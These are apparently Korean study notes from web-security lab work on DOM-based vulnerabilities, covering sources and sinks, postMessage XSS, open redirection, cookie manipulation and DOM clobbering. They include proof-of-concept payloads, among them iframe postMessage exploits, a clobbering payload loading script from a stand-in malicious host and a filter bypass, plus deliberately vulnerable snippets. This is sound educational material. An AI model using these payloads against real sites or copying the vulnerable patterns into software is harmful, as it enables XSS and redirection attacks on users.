## DOM 기반 취약점

#### DOM

DOM(Document Object Model, 문서 객체 모델)은 브라우저가 HTML 문서를 이해할 수 있도록 페이지의 요소들을 노드 트리 구조로 표현한 것임. JavaScript를 사용하여 DOM의 노드와 객체, 속성을 조작할 수 있음. 

#### 오염 흐름

DOM 기반 취약점은 서버가 아니라 **브라우저에서 실행되는 JavaScript** 때문에 발생함.

브라우저에서 JS가 다음과 같이 처리하면 DOM 기반 취약점 발생함.
1. 공격자가 조작할 수 있는 값(URL, 해시, 쿠키, referrer, postMessage 등)을 읽고
2. 그 값을 위험한 함수나 DOM 속성에 넣고
3. 그 위험한 곳이 그 값을 안전하지 않게 처리

**소스(Source)**: 공격자가 제어할 수 있는 데이터가 들어오는 입구 

- `location.search`: `?q=...` 쿼리 문자열
- `location.hash`: `#...` URL 조각
- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `document.cookie`
- `document.referrer`: 이전 페이지 URL
- `window.name`
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

**싱크(Sink)**: 그 데이터가 들어갔을 때 취약점이 될 수 있는 함수나 DOM 객체

- `eval()`: 문자열을 JavaScript 코드로 실행
- `document.body.innerHTML`: 문자열을 HTML로 해석
- `document.write()`: HTML 삽입
- `location = ...`, `location.href = ...`: 다른 URL로 이동
- `window.open()`: 새 창/리다이렉트
- `element.src`, `form.action` 등

| DOM 기반 취약점       | 예시 싱크                      |
| ---------------- | -------------------------- |
| DOM 기반 XSS       | `document.write()`         |
| 오픈 리다이렉션          | `window.location`          |
| 쿠키 조작            | `document.cookie`          |
| 자바스크립트 주입        | `eval()`                   |
| 문서 영역 조작         | `document.domain`          |
| 웹소켓 URL 포이즌닝     | `WebSocket()`              |
| 링크 조작            | `element.src`              |
| 웹 메시지 조작         | `postMessage()`            |
| Ajax 요청 헤더 조작    | `setRequestHeader()`       |
| 로컬 파일 경로 조작      | `FileReader.readAsText()`  |
| 클라이언트 측 SQL 인젝션  | `ExecuteSql()`             |
| HTML5 저장소 조작     | `sessionStorage.setItem()` |
| 클라이언트 측 XPath 주입 | `document.evaluate()`      |
| 클라이언트 측 JSON 주입  | `JSON.parse()`             |
| DOM 데이터 조작       | `element.setAttribute()`   |
| 서비스 거부           | `RegExp()`                 |


### 브라우저의 동작

#### HTML 파싱 

HTML 파서가 하는 일 
- 토큰화: `<a href="x">` → `[시작태그 a]`, `[속성 href]`, `[값 x]`
- 트리 구축: 토큰을 DOM 노드로 만들어 부모-자식 관계로 연결
- 엔티티 디코딩: `&quot;` → `"`, `&amp;` → `&`
- 따옴표 처리: `href="..."` vs `href='...'` vs `href=...` 구분
- 에러 복구: 닫히지 않은 태그, 잘못된 중첩 등을 브라우저가 임의로 처리
- 암묵적 태그 삽입: `<table><tr>` → `<tbody>` 자동 삽입

HTML 파싱이 일어나는 시점
1. **초기 문서 로드(네비게이션)**: 브라우저가 서버로부터 HTML 문서를 받으면 네트워크에서 데이터가 도착하는 즉시 파싱을 시작함. 
	- 참고: `<script>` 태그를 만나면 파싱이 일시 중단되고 해당 스크립트를 실행 후 재개됨. 따라서 스크립트 실행 시점에 DOM이 완성되지 않았을 수 있음. 

2. **`innerHTML` / `outerHTML` / `insertAdjacentHTML()` 실행**: JavaScript에서 `element.innerHTML = '...'`와 같이 HTML 문자열을 할당하면, 브라우저는 할당된 문자열을 즉시 HTML로 파싱하여 DOM에 반영

3. **DOM API를 통한 요소 생성**
	- 예: `document.createElement()`, `document.body.appendChild()` 등


#### URL 처리

**URL 파싱**: 하나의 긴 문자열로 이루어진 웹 주소(URL)를 프로토콜, 호스트, 포트, 경로, 쿼리 스트링 등 각각의 의미 있는 구성 요소로 쪼개고 분석하는 과정
**URL 인코딩**: 웹 주소에 사용할 수 없는 문자(한글, 공백 등)를 컴퓨터가 이해하는 안전한 기호로 변환하는 것 

URL 파싱이 일어나는 시점
1. 네비게이션: 주소창 입력, 링크 클릭 등
2. 리소스 로드: `src`, `href` 속성 등
3. DOM 속성 접근 (`.src`, `.href`): `<a>` 요소의 `.href` 프로퍼티에 접근하면, 브라우저는 **저장된 문자열을 URL로 파싱한 결과**를 반환
``` js
const a = document.createElement('a');
a.setAttribute('href', 'x"onerror=alert()');
console.log(a.getAttribute('href')); // 'x"onerror=alert()' (raw)
console.log(a.href); // 'https://.../x%22onerror=alert()' (파싱됨)
```

4. `fetch()`, `XMLHttpRequest.open()`: 네트워크 API에 전달된 URL 요청도 보내기 전에 URL 파서를 거침. 


### DOM 기반 XSS

[[01-XSS#DOM 기반 XSS]]


### 웹 메시지

웹 메시지는 서로 다른 출처(origin)의 **창, 탭, iframe 간에** 안전하게 데이터를 주고받을 수 있도록 HTML5에서 도입된 표준 API

``` js
targetWindow.postMessage(message, targetOrigin);
```
- `targetWindow`: 메세지를 보낼 브라우저 창 객체
	- 예: `iframe.contentWindow.postMessage(...)`, `popupWindow.postMessage(...)`, `window.parent.postMessage(...)`
- `targetOrigin`: 보내는 쪽의 브라우저가 메시지를 받을 브라우저의 출처를 검사 (`*` 사용 가능)

예시: `example.com`에서 `other.com`으로 메시지를 전송하는 경우

- `example.com`이 `ohter.com`을 iframe으로 띄운 상황
``` html 
<!-- example.com 페이지 -->
<iframe id="f" src="https://other.com/widget"></iframe>
<script>
  const f = document.getElementById('f');
  f.onload = () => {
    f.contentWindow.postMessage({ type: "hello" }, "https://other.com");
  };
</script>
```

``` js
// other.com/widget 페이지
window.addEventListener("message", (e) => {
  if (e.origin !== "https://example.com") return; // 발신자 검증
  console.log(e.data); // { type: "hello" }
});
```
- `e.origin`은 `example.com`에서 보낼때 설정하는 `targetOrigin`과는 다름. 브라우저가 자동으로 메세지를 전송하는 출처를 설정해줌. 

#### 취약점

웹 메세지의 출처를 검사하지 않거나 검사를 하더라도 우회가 가능한 경우 공격자의 서버에서 악성 웹 메시지를 보낼 수 있음. 
공격자가 제어할 수 있는 데이터를 `eval()`로 실행한다거나 하는 코드가 있으면 XSS가 발생함.

``` html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

공격 스크립트 
``` html
<!-- 해커의 페이지 -->
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```


**프로토콜 검증 우회**

``` html
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
    }, false);
</script>
```

``` html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```


**JSON을 주고 받는 경우**
- `onload` 사용
``` html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ 
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

- `setTimeout` 사용
``` html
<iframe id="f" src="https://0acc00d0037b9d8180688a9600440065.web-security-academy.net/" width="1000" height="1000"></iframe>
<script>
  document.getElementById('f').onload = function() {
    setTimeout(() => {
      this.contentWindow.postMessage(
        JSON.stringify({
          type: "load-channel",
          url: "javascript:print()"
        }),
        "*"
      );
    }, 500);
  };
</script>
```


### 오픈 리다이렉션

브라우저의 JavaScript에 의해 공격자가 지정한 외부 악성 사이트로 사용자를 리다이렉션 시키도록 하는 취약점
유효한 도메인과 안전한 HTTPS를 사용하기 때문에 취약점 공격 시 피해자에게 신뢰성을 줌. 

**조건** 
1. **소스(Source)**: 공격자가 제어할 수 있는 데이터가 들어옴 (예: `location.hash`)
2. **싱크(Sink)**: 그 데이터가 위험한 곳으로 전달됨 
	- 예: `location = ...`, `window.location.href = ...`
3. **검증 부재**: 소스에서 싱크로 가는 과정에서 이 URL이 우리 사이트인지, 신뢰할 수 있는 곳인지 검사하지 않음


**예시**
``` js
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

공격 스크립트 
``` url 
https://www.innocent-website.com/example#https://www.evil-user.net
```
- 피해자가 이 링크를 누른 경우 `https://www.evil-user.net`로 이동시킴. 

**영향**
1. 악성 사이트로 리다이렉션 시킬 수 있음. 
2. XSS: `javascript:`로 자바스크립트를 실행할 수 있음. 
	- 예: `location = javascript:...`


### 쿠키 조작

DOM 기반 쿠키 조작은 공격자가 제어할 수 있는 데이터를 쿠키의 값에 기록하는 경우 발생

**예시**
`/product` 페이지에서 경로가 쿠키로 지정되고 해당 쿠키 값을 화면에 출력하는 경우 
``` html
<script>
	document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

공격 스크립트 
``` html
<iframe src="https://target.com/product?productId=1&'><script>print()</script>" 
onload="if(!window.x)this.src='https://target.com';window.x=1;">
```
- `<iframe>`으로 쿠키를 지정하는 URL로 악성 스크립트를 쿠키로 지정
- `onload` 이벤트로 페이지가 로드되면 (쿠키가 지정되면) 새로운 화면을 보여으로써 그 화면에 출력된 악성 스크립트가 실행됨. 


### JavaScript 삽입

DOM 기반 JavaScript 삽입은 공격자가 제어할 수 있는 데이터를 JavaScript로 실행하는 경우 발생 

**예시**

- `eval()`
``` js
// URL의 해시(#) 부분을 읽어옵니다. (예: #alert(1))
let code = location.hash.slice(1); // '#alert(1)'에서 '#'을 떼어냄

// 사용자가 입력한 값을 그대로 eval()로 실행합니다.
if (code) {
  eval(code);
}
```

- `setTimeout()`
``` js
// URL 쿼리 스트링에서 'callback' 파라미터를 읽어옵니다.
// 예: ?callback=alert(1)
let callback = new URLSearchParams(location.search).get('callback');

// setTimeout의 첫 번째 인자로 문자열을 전달하면, 그 문자열을 코드로 실행합니다.
if (callback) {
  setTimeout(callback, 1000); // 1초 뒤에 실행
}
```


### `document.domain` 조작

공격자가 제어하는 데이터를 사용하여 `document.domain` 속성을 설정할 때 발생함. 
공격자가 자신의 사이트와 타겟 사이트의 `document.domain`을 동일하게 설정하면 동일 출처 정책 SOP를 우회해서 타겟 사이트의 요소에 접근할 수 있음. 

**현대 브라우저 대부분은 `document.domain` 속성의 설정 기능이 완전히 비활성화 됨.** 


### 웹소켓 URL 조작

DOM 기반 웹소켓 URL 조작은 공격자가 제어할 수 있는 데이터가 웹소켓 연결 대상 URL로 들어가는 경우 발생
공격자는 자신의 서버와 웹소켓을 연결하고 타겟 사이트의 민감한 데이터를 받거나 서버의 데이터로 타겟 사이트를 조작할 수 있음. 

**예시**
``` js
// URL 해시에서 값을 읽어옴 (공격자 제어 가능)
let wsUrl = location.hash.slice(1);

// 그 값을 그대로 WebSocket 연결 주소로 사용
let socket = new WebSocket(wsUrl);
```


### 링크 조작

DOM 기반 링크 조작은 공격자가 사용자가 클릭할 링크나 폼 전송 주소를 공격자가 원하는 데이터로 바꾸는 경우를 말함. 

1. `element.href` 조작: 링크의 주소를 바꿈. 
	- 상황: 사용자 프로필 페이지에 내 정보 보기라는 링크 주소는 URL의 해시(`#`) 값에 따라 동적으로 바뀜.
``` js
// URL의 해시 값을 읽어서 링크의 href에 넣음
let targetUrl = location.hash.slice(1);
document.getElementById("profileLink").href = targetUrl;
```

2. `element.action` 조작: `<form>` 태그의 전송 주소를 바꿈.
``` js
// 쿼리 스트링에서 'redirect' 값을 읽어서 폼 전송 주소로 설정
let redirectUrl = new URLSearchParams(location.search).get("redirect");
document.getElementById("loginForm").action = redirectUrl;
```

3. `element.src` 조작: `<script>`, `<img>`, `<iframe>` 등의 리소스 주소를 바꿈.
	- 공격자의 서버로 이미지를 요청하도록 할 수 있음.
	- `src`에 `javascript:`를 넣으면 XSS가 터질 수 있음.


### Ajax 요청 헤더 조작

DOM 기반 Ajax 요청 헤더 조작은 공격자가 제어할 수 있는 데이터가 `XMLHttpRequest`나 `fetch`의 헤더 설정을 하는 경우 발생


### 로컬 파일 경로 조작

DOM 기반 로컬 파일 경로 조작은 공격자가 제어할 수 있는 데이터를 파일 처리 API의 매개변수 `filename` 매개변수로 전달할때 발생

웹사이트가 그 파일을 어떻게 사용하느냐에 따라 공격의 영향이 달라짐. 
- 파일을 읽어서 화면에 표시하거나 서버로 전송하는 기능이 있으면 → **데이터 유출 가능**
- 파일에 데이터를 쓰는 기능이 있으면 → **덮어쓰기/조작 가능**
- 파일 경로를 받는 기능만 있고 아무 데도 안 쓰면 → 영향 없음

**예시**
``` js
// URL: https://site.com/app#file=/etc/passwd
const filename = new URLSearchParams(location.hash.slice(1)).get('file');

const reader = new FileReader();
// filename을 그대로 사용
reader.readAsText(filename); // 🚨 싱크
```


### 클라이언트 측 SQL 삽입

공격자가 제어하는 데이터를 클라이언트 측 SQL 쿼리에 포함 시키는 경우 발생함. 공격자는 다른 사용자가 해당 URL을 방문할 경우 해당 사용자의 브라우저 내의 **로컬 SQL 데이터베이스**에서 임의의 SQL 쿼리를 실행할 수 있음. 

**로컬 SQL 데이터베이스**
브라우저 안에서 SQL을 기반으로 데이터를 저장하는 데이터베이스로 현대의 브라우저(크롬, 사파리 등)에서는 IndexedDB로 전환이 되어 거의 사라졌지만 특정 환경에서는 여전히 사용됨
1. **Electron 데스크톱 앱**: Slack, Discord, VS Code, Notion 등 수많은 데스크톱 앱이 Electron으로 만들어지고 이 앱들은 내부적으로 로컬 **SQLite**를 사용함.
2. SQLite WASM을 쓰는 최신 웹 앱: **Local-First 웹 앱**(예: 오프라인 문서 편집기, 로컬 데이터 분석 도구)은 브라우저 안에서 SQLite를 WebAssembly로 돌림.


### HTML5 저장소 조작

DOM 기반 HTML5 저장소 조작은 공격자가 제어하는 데이터를 localStorage, sessionStorage에 저장하는 경우 발생함. 이것만으로는 취약점이 되지는 않고 공격자의 데이터가 다른 곳에서 취약점으로 이용되는 경우에 취약점이 됨. 

``` js
sessionStorage.setItem()
localStorage.setItem()
```

참고: localStorage, sessionStorage는 **출처(origin)별로 저장**이 되기 때문에 공격자가 데이터를 넣은 사이트에서 그 데이터를 안전하지 않게 꺼내 쓰는 취약점이 있어야함. 

| 저장소 | 범위 | 지속성 |
|---|---|---|
| localStorage | origin별 | 브라우저를 닫아도 유지 |
| sessionStorage | origin별 + 탭/창별 | 탭을 닫으면 삭제 |
| 쿠키 | 도메인별 (path, secure 등 추가 조건) | 만료 기간까지 

### XPath 주입

XPath는 XML/HTLM 문서에서 요소를 선택하는 언어임.
DOM 기반 XPath 삽입 취약점은 공격자가 제어할 수 있는 데이터를 XPath 쿼리에 포함시킬 때 발생

``` js
document.evaluate()
element.evaluate()
```


### DOM 클로버링

DOM 클로버링은 페이지에 HTML 요소를 삽입하여 Javascript의 객체(전역 변수)를 덮어쓰는 공격

**브라우저의 규칙**
HTML 요소에 `id`, `name` 속성이 있으면 그 이름으로 `window` 객체의 속성을 자동 생성함. 
예: 페이지에 이런 HTML이 있는 경우 JS에서 `window.myLink`로 접근이 가능함. 
``` html
<a id="myLink" href="https://example.com">링크</a>
```

``` js
window.myLink        // → <a> 요소
window.myLink.href   // → "https://example.com"
```

**`a`를 이용한 공격**
취약한 코드 
``` html
<script>
    window.onload = function(){
	    // someObject 객체의 url을 읽어서 스크립트 URL로 사용하는 코드
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;   // 🚨 여기가 핵심
        document.body.appendChild(script);
    };
</script> 
```

공격자가 삽입하는 HTML
``` html
<a id=someObject>
<a id=someObject name=url href=//malicious-website.com/evil.js>
```

동작 과정
1. 브라우저 규칙에 따라 `id=someObject`인 요소가 생김.
2. 같은 id가 2개면 컬렉션이 됨. (`a` 태그는 컬렉션이어야 다음 요소를 `id` 또는 `name`으로 접근 가능, named getter가 없음.)
``` js
window.someObject           // → HTMLCollection [<a>, <a>]
window.someObject[0]        // → 첫 번째 <a>
window.someObject[1]        // → 두 번째 <a>
```

3. `name=url`로 인해 `window.someObject.url`가 두번째 `<a>`를 가리킴.
``` js
window.someObject.url       // → 두 번째 <a> 요소
```

4. `script.src`는 문자열을 기대하는 속성이므로 자동 타입 변환을 함. 
``` js
script.src = someObject.url;
// 내부적으로 이렇게 동작:
script.src = String(someObject.url);
// = someObject.url.toString();
// = someObject.url.href <-- <a> 요소의 toString()은 href를 반환
```

5. 공격자가 지정한 URL을 가진 외부 스크립트를 삽입할 수 있음. 
	- `<script>` 같은 태그가 필요없고 CSP도 우회가 가능함. 



**`form`을 이용한 공격**

필터가 `form.attributes`를 검사하려고 하는데, `<input id=attributes>`가 그 속성을 가로채서 필터가 `onclick`을 못 보게 만드는 공격

클라이언트 측 HTML 필터 예시
``` js
function sanitize(element) {
    for (let i = 0; i < element.attributes.length; i++) {
        let attr = element.attributes[i];
        if (BLACKLIST.includes(attr.name)) {
            element.removeAttribute(attr.name);  // onclick 등 제거
        }
    }
    // 자식 요소들도 재귀적으로 검사
    for (let child of element.children) {
        sanitize(child);
    }
}
```

**정상 동작**: `<form onclick=alert(1)>`이 들어오면:
- `form.attributes` = `NamedNodeMap [onclick]`
- `form.attributes.length` = `1`
- 루프 실행 → `onclick` 발견 → 제거됨 


공격자가 삽입하는 HTML 
``` html
<form onclick=alert(1)><input id=attributes>Click me
```

동작 과정: 
- `form`은 기본적으로 이름으로 자손 요소에 접근이 가능함. (named getter)
	`form.someName`으로 접근하면:
	1. form의 **자손 요소 중** `id` 또는 `name`이 `someName`인 것을 찾아서 반환
	2. 없으면 **내장 속성**으로 폴백

- 공격자가 저 HTML을 삽입하면 필터에서 `form.attributes`가 `<input id=attributes>`을 가리키게 되고 필터를 우회함. 


